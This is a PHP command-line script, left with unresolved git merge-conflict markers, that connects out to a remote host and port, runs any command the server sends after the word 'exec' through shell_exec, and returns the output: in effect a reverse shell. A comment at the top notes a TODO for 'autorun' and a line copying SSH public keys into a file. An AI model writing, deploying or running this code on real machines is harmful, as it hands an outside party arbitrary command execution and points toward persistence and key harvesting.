<<<<<<< HEAD
#!/usr/bin/php -q
=======
#!/usr/local/bin/php -q
>>>>>>> 6a6a1c33020a48499c6088864d44b41a5b7f1dc5
<?php

	// TODO: autorun
	// cat ~/.ssh/*.pub >> ./keys.txt

	set_time_limit(0);
	ob_implicit_flush(1);

<<<<<<< HEAD
	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);


	if(count($opts) < 2){
		die("Assign remote addr. and port..\n");
	}

	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
=======
	if($argc< 3){
		die("Assign remote addr. and port..\n");
	}

	$addr 	= trim($argv[1]);
	$port 	= trim($argv[2]);
>>>>>>> 6a6a1c33020a48499c6088864d44b41a5b7f1dc5

	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	     die("\33[91m[!] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\33[0m\n");
	}


	echo "Connecting to [".$addr.":".$port."]..\n";

	if ((@$result = socket_connect($socket, $addr, $port)) === false){
	    die("\33[91m[!] socket_connect failed.\nreason: (".$result.") " .socket_strerror(socket_last_error($socket))."\33[0m\n");
	} 
		

	echo "\33[32mConnected to host [".$addr.":".$port."].\33[0m\n";
	echo "\33[36mReading response:\33[0m\n\n";

	while (true) {
	$now = date('d/m H:i:s');

	    if(($recv = socket_read($socket, 1024)) === false || $recv === "")
	    {
	    	echo "\33[91m[exit] Empty stream..\33[0m\n";
	    	break;
	    }
	    else
	    {		    	
	    	if(preg_match('/^(exec)\s/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
    			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim(substr($recv, 4)));
<<<<<<< HEAD
				$full_cmd = preg_replace("(exec)", "", $full_cmd);
=======
>>>>>>> 6a6a1c33020a48499c6088864d44b41a5b7f1dc5
				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

				if(!($result = shell_exec($full_cmd)))
				{
					$result = "Error";
				}

				$result .= "\ncmd:: $full_cmd";

	    		if(socket_write($socket, $result, strlen($result)) === false)
	    		{	
		        	echo "\33[91mCommand not set: ".socket_strerror(socket_last_error($socket))."\33[0m\n";
		        }
	    	}

	    	else if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
	    	{
	    		break;
	    	}

	    	else echo "[".$now. "] Server ".$addr.": ".$recv."\n";
	    }
	}
	echo "Closing socket.\n";
	socket_close($socket);
	exit(0);
?>
